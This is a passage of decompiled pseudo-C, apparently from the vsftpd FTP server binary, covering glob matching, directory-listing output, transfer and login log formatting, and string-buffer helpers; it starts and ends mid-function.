  __int64 v11; // rax
  int v12; // eax
  int v14; // [rsp+8h] [rbp-C0h]
  int v15; // [rsp+8h] [rbp-C0h]
  char v16; // [rsp+20h] [rbp-A8h]
  __int64 v17[2]; // [rsp+30h] [rbp-98h] BYREF
  __int64 v18[2]; // [rsp+40h] [rbp-88h] BYREF
  __int64 v19[2]; // [rsp+50h] [rbp-78h] BYREF
  __int64 v20[2]; // [rsp+60h] [rbp-68h] BYREF
  char *v21[11]; // [rsp+70h] [rbp-58h] BYREF

  v17[0] = 0LL;
  v21[3] = (char *)__readfsqword(0x28u);
  v17[1] = 0LL;
  v18[0] = 0LL;
  v18[1] = 0LL;
  v19[0] = 0LL;
  v19[1] = 0LL;
  v20[0] = 0LL;
  v20[1] = 0LL;
  v21[0] = 0LL;
  v21[1] = 0LL;
  sub_C3A0((__int64)v17, a2);
  v4 = 0;
  sub_C3A0((__int64)v18, a1);
  v14 = 1;
LABEL_2:
  for ( i = sub_C4F0((__int64)v17); !i; i = sub_C4F0((__int64)v17) )
  {
    if ( *a3 > 0x3E7u )
      break;
    v6 = sub_C900((__int64)v17, "*?{");
    ++*a3;
    v16 = v7;
    v8 = HIDWORD(v6);
    if ( (_DWORD)v6 )
    {
      sub_CE10((__int64)v17, (__int64)qword_220B70, HIDWORD(v6));
      sub_CEA0((__int64)v17, (__int64)v19, v8 + 1);
      sub_C3A0((__int64)v17, (__int64)v19);
      v4 = v16;
      if ( sub_C4F0((__int64)qword_220B70) )
      {
        if ( v16 == 63 )
          goto LABEL_22;
        goto LABEL_7;
      }
    }
    else
    {
      sub_C3A0((__int64)qword_220B70, (__int64)v17);
      sub_C570((__int64)v17);
      if ( sub_C4F0((__int64)qword_220B70) )
      {
        v14 = 0;
        v4 = 0;
        goto LABEL_2;
      }
      v4 = 0;
    }
    v11 = sub_CA50((__int64)v18, qword_220B70);
    if ( !(_DWORD)v11 || HIDWORD(v11) && v14 )
      goto LABEL_23;
    v15 = HIDWORD(v11);
    v12 = sub_C500((__int64)qword_220B70);
    sub_CEA0((__int64)v18, (__int64)v19, v12 + v15);
    sub_C3A0((__int64)v18, (__int64)v19);
    if ( v4 == 63 )
    {
LABEL_22:
      if ( sub_C4F0((__int64)v18) )
        goto LABEL_23;
      goto LABEL_11;
    }
LABEL_7:
    if ( v4 != 123 )
    {
      v14 = 0;
      goto LABEL_2;
    }
    if ( (unsigned int)sub_CA70((__int64)v17, 125) )
    {
      sub_CD40((__int64)v17, (__int64)v19, 125);
      sub_C3A0((__int64)v20, (__int64)v17);
      sub_C3A0((__int64)v17, (__int64)v19);
      sub_CD40((__int64)v20, (__int64)v19, 44);
      if ( !sub_C4F0((__int64)v20) )
      {
        while ( 1 )
        {
          sub_C3A0((__int64)v21, (__int64)v20);
          sub_C660(v21, (__int64)v17);
          if ( (unsigned int)sub_A8D0(v18, v21, a3) )
            break;
          sub_C3A0((__int64)v20, (__int64)v19);
          sub_CD40((__int64)v20, (__int64)v19, 44);
          if ( sub_C4F0((__int64)v20) )
            goto LABEL_23;
        }
        i = 1;
      }
      goto LABEL_23;
    }
    if ( sub_C4F0((__int64)v18) )
      goto LABEL_23;
    v4 = sub_CEE0((__int64)v18, 0);
    if ( v4 != 123 )
      goto LABEL_23;
LABEL_11:
    v9 = sub_C500((__int64)v18);
    sub_CE50((__int64)v18, (__int64)v19, v9 - 1);
    sub_C3A0((__int64)v18, (__int64)v19);
    v14 = 1;
  }
  v10 = sub_C500((__int64)v18);
  i = (v4 == 42 || !v10) && *a3 != 1000;
LABEL_23:
  sub_C440((__int64)v17);
  sub_C440((__int64)v18);
  sub_C440((__int64)v19);
  sub_C440((__int64)v20);
  sub_C440((__int64)v21);
  return i;
}
// A9C9: variable 'v7' is possibly undefined
// 220B70: using guessed type _QWORD qword_220B70[2];

//----- (000000000000ACF0) ----------------------------------------------------
unsigned __int64 __fastcall sub_ACF0(__int64 a1, __int64 a2, DIR *a3, __int64 a4, __int64 a5, __int64 a6, int a7)
{
  int v11; // r13d
  int v12; // r14d
  __int64 v13; // rax
  int v14; // edx
  bool v15; // zf
  int v16; // eax
  int v17; // r14d
  char v18; // al
  __int64 v19; // r14
  char *v20; // rax
  unsigned int v21; // eax
  signed int v22; // eax
  __int64 v23; // rsi
  struct group *v24; // rax
  const char *v25; // rax
  void *v27; // r14
  void *v28; // rdx
  int v29; // eax
  const char *v30; // rax
  signed int v31; // eax
  __int64 v32; // rsi
  struct passwd *v33; // rax
  const char *v34; // rax
  char *v35; // rax
  int v36; // eax
  int v38; // [rsp+24h] [rbp-A4h]
  _BOOL4 v39; // [rsp+28h] [rbp-A0h]
  int v40; // [rsp+2Ch] [rbp-9Ch]
  __int64 v41; // [rsp+38h] [rbp-90h]
  __int64 v42; // [rsp+40h] [rbp-88h]
  int v43; // [rsp+48h] [rbp-80h]
  signed int v44; // [rsp+4Ch] [rbp-7Ch]
  signed int v45; // [rsp+4Ch] [rbp-7Ch]
  int v46; // [rsp+50h] [rbp-78h] BYREF
  __int64 v47; // [rsp+54h] [rbp-74h]
  int v48; // [rsp+5Ch] [rbp-6Ch]
  char *v49[2]; // [rsp+60h] [rbp-68h] BYREF
  char *v50[3]; // [rsp+70h] [rbp-58h] BYREF
  unsigned __int64 v51; // [rsp+88h] [rbp-40h]
  int v52; // [rsp+D0h] [rbp+8h]

  v51 = __readfsqword(0x28u);
  v49[0] = 0LL;
  v49[1] = 0LL;
  v50[0] = 0LL;
  v50[1] = 0LL;
  v11 = sub_CA70(a5, 97);
  v40 = sub_CA70(a5, 114);
  v12 = sub_CA70(a5, 116);
  v43 = v12;
  v38 = sub_CA70(a5, 70);
  v13 = sub_CA70(a5, 108);
  v15 = (_DWORD)v13 == 0;
  v47 = v13;
  v16 = 1;
  if ( v15 )
    v16 = a7;
  v48 = v14;
  v52 = v16;
  if ( !v12 )
  {
    v39 = a2 != 0 || (v16 | v38) != 0;
    if ( sub_C4F0(a6) )
      goto LABEL_5;
LABEL_44:
    if ( (unsigned __int8)sub_CEE0(a6, 0) == 46 )
      v11 = 1;
    goto LABEL_5;
  }
  v39 = 1;
  v40 = v40 == 0;
  if ( !sub_C4F0(a6) )
    goto LABEL_44;
LABEL_5:
  if ( !sub_C600(a4, ".") )
    sub_C3A0((__int64)v50, a4);
  if ( !sub_C4F0((__int64)v50) )
  {
    v36 = sub_C500((__int64)v50);
    if ( (unsigned __int8)sub_CEE0((__int64)v50, v36 - 1) != 47 )
      sub_C6A0(v50, 47);
  }
  v41 = 0LL;
  if ( v52 )
    v41 = sub_15470();
  while ( 1 )
  {
    sub_D790((__int64)&unk_220BE0, a3);
    if ( sub_C4F0((__int64)&unk_220BE0) )
      break;
    v17 = sub_C500((__int64)&unk_220BE0);
    if ( v17 > 0 && (v18 = sub_CEE0((__int64)&unk_220BE0, 0), !v11) && v18 == 46 )
    {
      if ( dword_221C80 )
      {
        if ( v17 == 2 )
        {
          if ( (unsigned __int8)sub_CEE0((__int64)&unk_220BE0, 1u) != 46 )
            goto LABEL_14;
        }
        else if ( v17 != 1 )
        {
          goto LABEL_14;
        }
      }
    }
    else
    {
LABEL_14:
      if ( sub_10CF0((__int64)&unk_220BE0) )
      {
        if ( sub_C4F0(a6) || (v46 = 0, sub_A8D0((__int64)&unk_220BE0, a6, &v46)) )
        {
          sub_C3A0((__int64)&unk_220BD0, (__int64)v50);
          sub_C660((char **)&unk_220BD0, (__int64)&unk_220BE0);
          if ( !v39 || (v29 = sub_D6C0(&unk_220BD0, (struct stat64 **)&qword_220BC0), !(unsigned int)sub_13F40(v29)) )
          {
            if ( v52 )
            {
              sub_C3A0((__int64)&unk_220BB0, (__int64)&unk_220BE0);
              if ( sub_13A40(qword_220BC0)
                && !(unsigned int)sub_D7D0((__int64)&unk_220BA0, &unk_220BD0)
                && !sub_C4F0((__int64)&unk_220BA0) )
              {
                sub_C670((char **)&unk_220BB0, " -> ");
                sub_C660((char **)&unk_220BB0, (__int64)&unk_220BA0);
              }
              v19 = qword_220BC0;
              if ( v38 )
              {
                if ( sub_13A80(qword_220BC0) )
                  sub_C6A0((char **)&unk_220BB0, 47);
                v19 = qword_220BC0;
              }
              v42 = sub_13D50(v19);
              v20 = sub_13AA0(v19);
              sub_C370((__int64)v49, v20);
              sub_C6A0(v49, 32);
              v21 = sub_13DA0(v19);
              sub_C3E0((__int64)&unk_220B80, v21);
              sub_C810((__int64)&unk_220B80, 4u);
              sub_C660(v49, (__int64)&unk_220B80);
              sub_C6A0(v49, 32);
              if ( dword_221AD4 )
              {
                sub_C370((__int64)&unk_220B80, "ftp");
              }
              else
              {
                v31 = sub_13D80(v19);
                v32 = v31;
                if ( dword_221B4C && (v45 = v31, v33 = sub_14E60(v31), v32 = v45, v33) )
                {
                  v34 = (const char *)sub_14EA0((__int64)v33);
                  sub_C370((__int64)&unk_220B80, v34);
                }
                else
                {
                  sub_C3E0((__int64)&unk_220B80, v32);
                }
              }
              sub_C7A0((__int64)&unk_220B80, 8u);
              sub_C660(v49, (__int64)&unk_220B80);
              sub_C6A0(v49, 32);
              if ( dword_221AD4 )
              {
                sub_C370((__int64)&unk_220B80, "ftp");
              }
              else
              {
                v22 = sub_13D90(v19);
                v23 = v22;
                if ( dword_221B4C && (v44 = v22, v24 = sub_14EE0(v22), v23 = v44, v24) )
                {
                  v25 = (const char *)sub_14F10((__int64)v24);
                  sub_C370((__int64)&unk_220B80, v25);
                }
                else
                {
                  sub_C3E0((__int64)&unk_220B80, v23);
                }
              }
              sub_C7A0((__int64)&unk_220B80, 8u);
              sub_C660(v49, (__int64)&unk_220B80);
              sub_C6A0(v49, 32);
              sub_C410((__int64)&unk_220B80, v42);
              sub_C810((__int64)&unk_220B80, 8u);
              sub_C660(v49, (__int64)&unk_220B80);
              sub_C6A0(v49, 32);
              v35 = sub_13C60(v19, dword_221A34, v41);
              sub_C670(v49, v35);
              sub_C6A0(v49, 32);
              sub_C660(v49, (__int64)&unk_220BB0);
              sub_C670(v49, "\r\n");
            }
            else
            {
              sub_C3A0((__int64)v49, (__int64)&unk_220BD0);
              if ( v38 )
              {
                if ( sub_13A80(qword_220BC0) )
                {
                  sub_C6A0(v49, 47);
                }
                else if ( sub_13A40(qword_220BC0) )
                {
                  sub_C6A0(v49, 64);
                }
              }
              sub_C670(v49, "\r\n");
            }
            v27 = 0LL;
            v28 = &unk_220BE0;
            if ( v43 )
            {
              v27 = &unk_220B90;
              v30 = (const char *)sub_13DC0(qword_220BC0);
              sub_C370((__int64)&unk_220B90, v30);
              v28 = &unk_220B90;
            }
            sub_D9F0(a1, (__int64)v49, (__int64)v28);
            if ( a2 )
            {
              if ( sub_13A80(qword_220BC0) )
                sub_D9F0(a2, (__int64)&unk_220BE0, (__int64)v27);
            }
          }
        }
      }
    }
  }
  sub_DAA0(a1, v40);
  if ( a2 )
    sub_DAA0(a2, v40);
  sub_C440((__int64)v49);
  sub_C440((__int64)v50);
  return __readfsqword(0x28u) ^ v51;
}
// ADB8: variable 'v14' is possibly undefined
// 220BC0: using guessed type __int64 qword_220BC0;
// 221A34: using guessed type int dword_221A34;
// 221AD4: using guessed type int dword_221AD4;
// 221B4C: using guessed type int dword_221B4C;
// 221C80: using guessed type int dword_221C80;

//----- (000000000000B4F0) ----------------------------------------------------
void __fastcall __noreturn sub_B4F0(_DWORD *a1, __int64 a2)
{
  int v2; // r9d
  int v3; // ecx
  char v4; // al
  __int16 v5; // ax
  unsigned int v6; // ebp
  unsigned int v7; // eax
  int v8; // ebp
  __int64 v9[2]; // [rsp+0h] [rbp-48h] BYREF
  __int64 v10[7]; // [rsp+10h] [rbp-38h] BYREF

  v2 = a1[18];
  v10[3] = __readfsqword(0x28u);
  if ( v2 || !dword_221A7C )
  {
    v9[0] = 0LL;
    v9[1] = 0LL;
    v10[0] = 0LL;
    v10[1] = 0LL;
    sub_C370((__int64)v9, (const char *)qword_221C78);
    sub_C370((__int64)v10, (const char *)qword_221AC0);
    v3 = dword_221C18 != 0;
    if ( dword_221A60 )
      v3 |= 2u;
    a2 = (__int64)v10;
    sub_E310(v9, (__int64)v10, 0LL, v3, 1);
    sub_C440((__int64)v9);
    sub_C440((__int64)v10);
  }
  while ( 1 )
  {
    while ( 1 )
    {
      v4 = sub_9100(a1[94]);
      if ( !dword_221C18 || v4 != 2 )
        break;
      v8 = sub_91A0((unsigned int)a1[94]);
      sub_FB10(a1, v8);
      sub_13880(v8);
      a2 = 1LL;
      sub_9160(a1[94], 1);
    }
    switch ( v4 )
    {
      case 3:
        v5 = sub_9260(a1[94]);
        v6 = sub_F710((_WORD **)a1, v5, 0);
        if ( v6 != -1 )
          goto LABEL_15;
        a2 = 2LL;
        sub_9160(a1[94], 2);
        break;
      case 10:
        sub_F870((__int64)a1);
        a2 = 1LL;
        sub_9160(a1[94], 1);
        break;
      case 11:
        v7 = sub_F8A0((__int64)a1);
        a2 = v7;
        sub_91B0(a1[94], v7);
        break;
      case 12:
        LODWORD(a2) = (unsigned __int16)sub_F8B0((__int64)a1, a2);
        sub_91B0(a1[94], a2);
        break;
      case 13:
        v6 = sub_FA50((__int64)a1);
        if ( (v6 & 0x80000000) == 0 )
        {
LABEL_15:
          sub_9160(a1[94], 1);
          a2 = v6;
          sub_9190((unsigned int)a1[94], v6);
          sub_13880(v6);
        }
        else
        {
          sub_9160(a1[94], 2);
          a2 = v6;
          sub_91B0(a1[94], v6);
        }
        break;
      default:
        sub_4B80();
    }
  }
}
// 9190: using guessed type __int64 __fastcall sub_9190(_QWORD, _QWORD);
// 91A0: using guessed type __int64 __fastcall sub_91A0(_QWORD);
// 221A60: using guessed type int dword_221A60;
// 221A7C: using guessed type int dword_221A7C;
// 221AC0: using guessed type __int64 qword_221AC0;
// 221C18: using guessed type int dword_221C18;
// 221C78: using guessed type __int64 qword_221C78;

//----- (000000000000B730) ----------------------------------------------------
__int64 __fastcall sub_B730(unsigned int fd)
{
  unsigned int v1; // eax
  __int64 result; // rax

  if ( dword_221C04 || (v1 = sub_13E70(fd), result = sub_13F40(v1), !(_DWORD)result) )
  {
    sub_D210((__int64)&unk_220C00, 63);
    sub_C6A0((char **)&unk_220C00, 10);
    sub_D580(&unk_220C00, fd);
    result = (unsigned int)dword_221C04;
    if ( !dword_221C04 )
      return sub_13E90(fd);
  }
  return result;
}
// 221C04: using guessed type int dword_221C04;

//----- (000000000000B7A0) ----------------------------------------------------
__int64 __fastcall sub_B7A0(__int64 a1, int a2, int a3, __int64 a4)
{
  __int64 v6; // r13
  __int64 result; // rax
  __time_t v8; // rbx
  double v9; // xmm1_8
  char *v10; // rax
  unsigned int v11; // eax
  double v12; // [rsp+8h] [rbp-40h]

  sub_C570((__int64)&unk_220C00);
  if ( !dword_221BC8 )
  {
    v10 = sub_154A0();
    v6 = a1 + 80;
    sub_C670((char **)&unk_220C00, v10);
    sub_C670((char **)&unk_220C00, " [pid ");
    v11 = sub_12BE0();
    sub_C6C0((char **)&unk_220C00, v11);
    sub_C670((char **)&unk_220C00, "] ");
    if ( sub_C4F0(a1 + 80) )
      goto LABEL_3;
LABEL_23:
    sub_C6A0((char **)&unk_220C00, 91);
    sub_C660((char **)&unk_220C00, v6);
    sub_C670((char **)&unk_220C00, "] ");
    goto LABEL_3;
  }
  v6 = a1 + 80;
  if ( !sub_C4F0(a1 + 80) )
    goto LABEL_23;
LABEL_3:
  if ( (unsigned int)(a3 - 6) > 2 && a3 != 13 )
  {
    if ( a2 )
      sub_C670((char **)&unk_220C00, "OK ");
    else
      sub_C670((char **)&unk_220C00, "FAIL ");
  }
  switch ( a3 )
  {
    case 2:
      sub_C670((char **)&unk_220C00, "DOWNLOAD");
      goto LABEL_28;
    case 3:
      sub_C670((char **)&unk_220C00, "UPLOAD");
      goto LABEL_28;
    case 4:
      sub_C670((char **)&unk_220C00, "MKDIR");
      goto LABEL_28;
    case 5:
      sub_C670((char **)&unk_220C00, "LOGIN");
      sub_C670((char **)&unk_220C00, ": Client \"");
      sub_C660((char **)&unk_220C00, a1 + 280);
      sub_C6A0((char **)&unk_220C00, 34);
      if ( !sub_C4F0(a1 + 96) )
      {
        sub_C670((char **)&unk_220C00, ", anon password \"");
        sub_C660((char **)&unk_220C00, a1 + 96);
        sub_C6A0((char **)&unk_220C00, 34);
      }
      result = sub_C4F0(a4);
      if ( !(_DWORD)result )
        goto LABEL_15;
      if ( !*(_QWORD *)(a1 + 336) )
        return result;
      goto LABEL_30;
    case 6:
      sub_C670((char **)&unk_220C00, "FTP command");
      goto LABEL_25;
    case 7:
      sub_C670((char **)&unk_220C00, "FTP response");
      goto LABEL_25;
    case 8:
      sub_C670((char **)&unk_220C00, "CONNECT");
      goto LABEL_28;
    case 9:
      sub_C670((char **)&unk_220C00, "DELETE");
      goto LABEL_28;
    case 10:
      sub_C670((char **)&unk_220C00, "RENAME");
      goto LABEL_28;
    case 11:
      sub_C670((char **)&unk_220C00, "RMDIR");
      goto LABEL_28;
    case 12:
      sub_C670((char **)&unk_220C00, "CHMOD");
LABEL_28:
      sub_C670((char **)&unk_220C00, ": Client \"");
      sub_C660((char **)&unk_220C00, a1 + 280);
      sub_C6A0((char **)&unk_220C00, 34);
      result = sub_C4F0(a4);
      if ( !(_DWORD)result )
        goto LABEL_15;
      if ( *(_QWORD *)(a1 + 336) )
        goto LABEL_30;
      goto LABEL_18;
    case 13:
      sub_C670((char **)&unk_220C00, "DEBUG");
LABEL_25:
      sub_C670((char **)&unk_220C00, ": Client \"");
      sub_C660((char **)&unk_220C00, a1 + 280);
      sub_C6A0((char **)&unk_220C00, 34);
      result = sub_C4F0(a4);
      if ( (_DWORD)result )
        return result;
LABEL_15:
      sub_C670((char **)&unk_220C00, ", \"");
      sub_C660((char **)&unk_220C00, a4);
      result = sub_C6A0((char **)&unk_220C00, 34);
      if ( (unsigned int)(a3 - 6) <= 1 || a3 == 13 )
        return result;
      if ( *(_QWORD *)(a1 + 336) )
      {
LABEL_30:
        sub_C670((char **)&unk_220C00, ", ");
        sub_C6F0((char **)&unk_220C00, *(_QWORD *)(a1 + 336));
        result = sub_C670((char **)&unk_220C00, " bytes");
      }
LABEL_18:
      if ( (unsigned int)(a3 - 2) <= 1 )
      {
        v8 = sub_15470() - *(_QWORD *)(a1 + 304);
        v9 = (double)(int)(sub_155B0() - *(_DWORD *)(a1 + 312)) / 1000000.0 + (double)(int)v8;
        if ( v9 <= 0.0 )
          v9 = 0.1;
        v12 = (double)(int)*(_QWORD *)(a1 + 336) / v9 * 0.0009765625;
        sub_C670((char **)&unk_220C00, ", ");
        sub_C720((char **)&unk_220C00, v12);
        return sub_C670((char **)&unk_220C00, "Kbyte/sec");
      }
      return result;
    default:
      sub_4B30("bad entry_type in vsf_log_do_log");
  }
}
// 12BE0: using guessed type __int64 sub_12BE0(void);
// 221BC8: using guessed type int dword_221BC8;

//----- (000000000000BD60) ----------------------------------------------------
__int64 __fastcall sub_BD60(__int64 a1, int a2, int a3, __int64 a4)
{
  __int64 result; // rax
  __int64 v8; // r14
  char *v9; // rax
  __time_t v10; // rax
  __int64 v11; // rsi
  int v12; // eax

  if ( *(_DWORD *)(a1 + 268) == -1 || (unsigned int)(a3 - 2) > 1 )
    goto LABEL_3;
  v8 = *(_QWORD *)(a1 + 296);
  v9 = sub_154A0();
  sub_C370((__int64)&unk_220C00, v9);
  sub_C6A0((char **)&unk_220C00, 32);
  v10 = sub_15470() - *(_QWORD *)(a1 + 304);
  v11 = 1LL;
  if ( v10 > 0 )
    v11 = v10;
  sub_C6C0((char **)&unk_220C00, v11);
  sub_C6A0((char **)&unk_220C00, 32);
  sub_C660((char **)&unk_220C00, a1 + 280);
  sub_C6A0((char **)&unk_220C00, 32);
  sub_C6F0((char **)&unk_220C00, *(_QWORD *)(a1 + 336));
  sub_C6A0((char **)&unk_220C00, 32);
  sub_C3A0((__int64)&unk_220BF0, a1 + 320);
  sub_C8D0((__int64)&unk_220BF0, 32, 95);
  sub_C660((char **)&unk_220C00, (__int64)&unk_220BF0);
  sub_C6A0((char **)&unk_220C00, 32);
  if ( *(_DWORD *)(a1 + 120) )
    sub_C670((char **)&unk_220C00, "a ");
  else
    sub_C670((char **)&unk_220C00, "b ");
  sub_C670((char **)&unk_220C00, "_ ");
  if ( (_DWORD)v8 == 3 )
    sub_C670((char **)&unk_220C00, "i ");
  else
    sub_C670((char **)&unk_220C00, "o ");
  v12 = *(_DWORD *)(a1 + 76);
  if ( *(_DWORD *)(a1 + 72) )
  {
    if ( !v12 )
    {
      sub_C670((char **)&unk_220C00, "a ");
      sub_C660((char **)&unk_220C00, a1 + 96);
      goto LABEL_17;
    }
  }
  else if ( !v12 )
  {
    sub_C670((char **)&unk_220C00, "r ");
    goto LABEL_16;
  }
  sub_C670((char **)&unk_220C00, "g ");
LABEL_16:
  sub_C660((char **)&unk_220C00, a1 + 80);
LABEL_17:
  sub_C6A0((char **)&unk_220C00, 32);
  sub_C670((char **)&unk_220C00, "ftp 0 * ");
  if ( a2 )
    sub_C6A0((char **)&unk_220C00, 99);
  else
    sub_C6A0((char **)&unk_220C00, 105);
  sub_B730(*(_DWORD *)(a1 + 268));
LABEL_3:
  if ( *(_DWORD *)(a1 + 272) != -1 )
  {
    sub_B7A0(a1, a2, a3, a4);
    sub_B730(*(_DWORD *)(a1 + 272));
  }
  result = (unsigned int)dword_221BC8;
  if ( dword_221BC8 )
  {
    sub_B7A0(a1, a2, a3, a4);
    return sub_D870(&unk_220C00, (a3 == 5) & (unsigned __int8)(a2 == 0));
  }
  return result;
}
// 221BC8: using guessed type int dword_221BC8;

//----- (000000000000C060) ----------------------------------------------------
__int64 __fastcall sub_C060(__int64 a1)
{
  __int64 result; // rax
  int v2; // ebp
  int v3; // ecx
  int v4; // ebp

  if ( dword_221BC8 || dword_221B3C )
  {
    sub_15680(1);
    result = (unsigned int)dword_221A38;
    if ( !dword_221B74 )
    {
LABEL_4:
      if ( !(_DWORD)result )
        return result;
      goto LABEL_5;
    }
  }
  else
  {
    result = (unsigned int)dword_221A38;
    if ( !dword_221B74 )
      goto LABEL_4;
  }
  if ( !(_DWORD)result && !dword_221C44 )
  {
LABEL_7:
    if ( !dword_221BC8 )
    {
      v4 = sub_13850((const char *)qword_221B40, 0x180u);
      result = sub_13F40(v4);
      if ( (_DWORD)result )
        sub_4BA0("failed to open vsftpd log file:", (const char *)qword_221B40);
      *(_DWORD *)(a1 + 272) = v4;
    }
    return result;
  }
LABEL_5:
  v2 = sub_13850((const char *)qword_221BA8, 0x180u);
  result = sub_13F40(v2);
  if ( (_DWORD)result )
    sub_4BA0("failed to open xferlog log file:", (const char *)qword_221BA8);
  v3 = dword_221A38;
  *(_DWORD *)(a1 + 268) = v2;
  if ( v3 )
    goto LABEL_7;
  result = (unsigned int)dword_221C44;
  if ( !dword_221C44 )
    goto LABEL_7;
  return result;
}
// 221A38: using guessed type int dword_221A38;
// 221B3C: using guessed type int dword_221B3C;
// 221B40: using guessed type __int64 qword_221B40;
// 221B74: using guessed type int dword_221B74;
// 221BA8: using guessed type __int64 qword_221BA8;
// 221BC8: using guessed type int dword_221BC8;
// 221C44: using guessed type int dword_221C44;

//----- (000000000000C1A0) ----------------------------------------------------
__suseconds_t __fastcall sub_C1A0(_QWORD *a1, unsigned int a2)
{
  __suseconds_t result; // rax

  if ( a1[37] )
    sub_4B30("non null log_type in vsf_log_start_entry");
  a1[38] = 0LL;
  a1[37] = a2;
  a1[39] = 0LL;
  a1[42] = 0LL;
  result = (__suseconds_t)sub_C570((__int64)(a1 + 40));
  if ( a2 - 2 <= 1 )
  {
    a1[38] = sub_15470();
    result = sub_155B0();
    a1[39] = result;
  }
  return result;
}

//----- (000000000000C230) ----------------------------------------------------
__int64 __fastcall sub_C230(__int64 a1, int a2, __int64 a3)
{
  return sub_BD60(a1, 1, a2, a3);
}

//----- (000000000000C240) ----------------------------------------------------
_BOOL8 __fastcall sub_C240(__int64 a1)
{
  return *(_QWORD *)(a1 + 296) != 0LL;
}

//----- (000000000000C250) ----------------------------------------------------
void __fastcall sub_C250(__int64 a1)
{
  *(_QWORD *)(a1 + 296) = 0LL;
}

//----- (000000000000C260) ----------------------------------------------------
__int64 __fastcall sub_C260(__int64 a1, int a2)
{
  __int64 result; // rax

  result = sub_BD60(a1, a2, *(_DWORD *)(a1 + 296), a1 + 320);
  *(_QWORD *)(a1 + 296) = 0LL;
  return result;
}

//----- (000000000000C290) ----------------------------------------------------
__int64 __fastcall sub_C290(__int64 a1, const void *a2, unsigned int a3)
{
  unsigned int v3; // r13d
  void *v5; // r12
  void *v6; // rax
  __int64 result; // rax

  v3 = a3 + 1;
  v5 = *(void **)a1;
  if ( *(_DWORD *)(a1 + 12) < a3 + 1 )
  {
    if ( v5 )
      sub_12BB0(*(void **)a1);
    *(_QWORD *)a1 = 0LL;
    *(_QWORD *)(a1 + 8) = 0LL;
    v6 = sub_12AE0(v3);
    v5 = v6;
    if ( *(_QWORD *)a1 )
      sub_4B30("p_buf not NULL when setting it");
    *(_QWORD *)a1 = v6;
    *(_DWORD *)(a1 + 12) = v3;
  }
  sub_13670(v5, a2, a3);
  result = a3;
  *(_BYTE *)(*(_QWORD *)a1 + a3) = 0;
  *(_DWORD *)(a1 + 8) = a3;
  return result;
}

//----- (000000000000C310) ----------------------------------------------------
__int64 __fastcall sub_C310(char **a1, const void *a2, int a3)
{
  __int64 v5; // rdx
  char *v6; // rdi
  unsigned int v7; // r12d
  char *v8; // rax
  __int64 result; // rax

  v5 = *((unsigned int *)a1 + 2);
  v6 = *a1;
  v7 = v5 + a3 + 1;
  if ( *((_DWORD *)a1 + 3) < v7 )
  {
    v8 = (char *)sub_12B40(v6, v7);
    v5 = *((unsigned int *)a1 + 2);
    v6 = v8;
    *a1 = v8;
    *((_DWORD *)a1 + 3) = v7;
  }
  sub_13670(&v6[v5], a2, a3);
  result = (unsigned int)(*((_DWORD *)a1 + 2) + a3);
  (*a1)[result] = 0;
  *((_DWORD *)a1 + 2) += a3;
  return result;
}

//----- (000000000000C370) ----------------------------------------------------
__int64 __fastcall sub_C370(__int64 a1, const char *a2)
{
  unsigned int v2; // eax

  v2 = sub_13610(a2);
  return sub_C290(a1, a2, v2);
}

//----- (000000000000C3A0) ----------------------------------------------------
__int64 __fastcall sub_C3A0(__int64 a1, __int64 a2)
{
  return sub_C290(a1, *(const void **)a2, *(_DWORD *)(a2 + 8));
}

//----- (000000000000C3B0) ----------------------------------------------------
__int64 __fastcall sub_C3B0(__int64 a1, _BYTE *a2, char a3)
{
  _BYTE *v4; // rax
  unsigned int v5; // edx

  if ( a3 == *a2 )
  {
    v5 = 0;
  }
  else
  {
    v4 = a2;
    do
      v5 = (_DWORD)++v4 - (_DWORD)a2;
    while ( *v4 != a3 );
  }
  return sub_C290(a1, a2, v5);
}

//----- (000000000000C3E0) ----------------------------------------------------
__int64 __fastcall sub_C3E0(__int64 a1, __int64 a2)
{
  const char *v2; // rbx
  unsigned int v3; // eax

  v2 = (const char *)sub_132D0(a2);
  v3 = sub_13610(v2);
  return sub_C290(a1, v2, v3);
}

//----- (000000000000C410) ----------------------------------------------------
__int64 __fastcall sub_C410(__int64 a1, __int64 a2)
{
  const char *v2; // rbx
  unsigned int v3; // eax

  v2 = (const char *)sub_13310(a2);
  v3 = sub_13610(v2);
  return sub_C290(a1, v2, v3);
}

//----- (000000000000C440) ----------------------------------------------------
void __fastcall sub_C440(__int64 a1)
{
  void *v2; // rdi

  v2 = *(void **)a1;
  if ( v2 )
    sub_12BB0(v2);
  *(_QWORD *)a1 = 0LL;
  *(_QWORD *)(a1 + 8) = 0LL;
}

//----- (000000000000C470) ----------------------------------------------------
__int64 __fastcall sub_C470(__int64 *a1, unsigned int a2)
{
  __int64 result; // rax

  if ( *((_DWORD *)a1 + 3) <= a2 )
    sub_4B30("trunc_len not smaller than alloc_bytes in str_trunc");
  result = *a1;
  *((_DWORD *)a1 + 2) = a2;
  *(_BYTE *)(result + a2) = 0;
  return result;
}

//----- (000000000000C4B0) ----------------------------------------------------
_BYTE *__fastcall sub_C4B0(__int64 a1, int a2)
{
  _BYTE *result; // rax
  unsigned int v3; // r12d

  result = *(_BYTE **)a1;
  v3 = a2 + 1;
  if ( *(_DWORD *)(a1 + 12) < (unsigned int)(a2 + 1) )
  {
    result = sub_12B40(*(void **)a1, v3);
    *(_DWORD *)(a1 + 12) = v3;
    *(_QWORD *)a1 = result;
  }
  result[a2] = 0;
  return result;
}

//----- (000000000000C4F0) ----------------------------------------------------
_BOOL8 __fastcall sub_C4F0(__int64 a1)
{
  return *(_DWORD *)(a1 + 8) == 0;
}

//----- (000000000000C500) ----------------------------------------------------
__int64 __fastcall sub_C500(__int64 a1)
{
  return *(unsigned int *)(a1 + 8);
}

//----- (000000000000C510) ----------------------------------------------------
__int64 __fastcall sub_C510(_QWORD *a1)
{
  __int64 result; // rax

  result = *a1;
  if ( !*a1 )
  {
    if ( a1[1] )
      sub_4B30("p_buf NULL and len or alloc_bytes != 0 in str_getbuf");
    sub_C290((__int64)a1, 0LL, 0);
    return *a1;
  }
  return result;
}

//----- (000000000000C550) ----------------------------------------------------
char *__fastcall sub_C550(_QWORD *a1)
{
  const char *v1; // rax

  v1 = (const char *)sub_C510(a1);
  return j__strdup(v1);
}

//----- (000000000000C570) ----------------------------------------------------
_BYTE *__fastcall sub_C570(__int64 a1)
{
  _BYTE *result; // rax

  sub_C510((_QWORD *)a1);
  if ( !*(_DWORD *)(a1 + 12) )
    sub_4B30("trunc_len not smaller than alloc_bytes in str_trunc");
  result = *(_BYTE **)a1;
  *(_DWORD *)(a1 + 8) = 0;
  *result = 0;
  return result;
}

//----- (000000000000C5A0) ----------------------------------------------------
int __fastcall sub_C5A0(__int64 a1, __int64 a2)
{
